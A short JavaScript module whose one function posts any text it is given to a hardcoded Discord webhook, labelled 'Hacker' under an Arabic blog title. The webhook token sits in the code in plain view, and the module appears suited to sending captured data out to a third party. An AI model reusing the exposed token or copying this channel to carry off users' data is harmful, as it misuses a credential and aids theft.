import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة زاجل ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1336320711005962321/lzPcDbFrrBlrADYl6CWbHWdaJWgdVZOcA7XRPgKKhlG5vd6fBZPvW6JcOupjT1S_0DZH",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
